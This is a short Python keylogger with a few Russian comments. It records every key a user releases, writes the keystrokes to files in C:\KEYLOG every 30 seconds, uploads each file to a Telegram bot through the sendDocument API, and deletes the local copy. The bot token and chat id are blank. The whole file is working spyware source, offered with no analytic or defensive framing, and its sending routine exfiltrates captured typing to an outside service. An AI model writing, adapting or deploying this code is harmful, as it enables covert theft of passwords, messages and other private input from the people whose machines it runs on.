import os

import keyboard
from threading import Timer
from datetime import datetime
import requests
SEND_REPORT_EVERY = 30
if os.path.isdir('new_folder'):
    pass
else:
    os.mkdir("C://KEYLOG")
def send(t):
    bot_token = ""
    bot_chatId = ""
    send_document = 'https://api.telegram.org/bot' + bot_token + '/sendDocument?'
    data = {
        'chat_id': bot_chatId,
        'parse_mode': 'HTML',
        'caption': ''
    }
    with open(f'C:\\KEYLOG\\{t}.txt') as file:
       file_location  = file.name
    files = {
        'document': open(file_location, 'rb')
    }
    r = requests.post(send_document, data=data, files=files, stream=True)
    print(r.url)
    return r.json()
def dr(t):
    with open(f'C:\\KEYLOG\\{t}.txt') as file:
       file_location  = file.name
    os.remove(file_location)
    return 1

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name

        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # Заменим пробелы спец клавиш символами подчеркивания
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # Добавим имя ключа в лог
        self.log += name

    def update_LOGGER(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.LOGGER = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        with open(f"C:\\KEYLOG\\{self.LOGGER}.txt", "w") as f:
            print(self.log, file=f)
        send(self.LOGGER)
        os.remove(f"C:\\KEYLOG\\{self.LOGGER}.txt")

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.update_LOGGER()
            self.report_to_file()
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True

        timer.start()

    def start(self):
        # Записать дату и время начала
        self.start_dt = datetime.now()

        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()


if __name__ == "__main__":

    Keylogger(interval=SEND_REPORT_EVERY).start()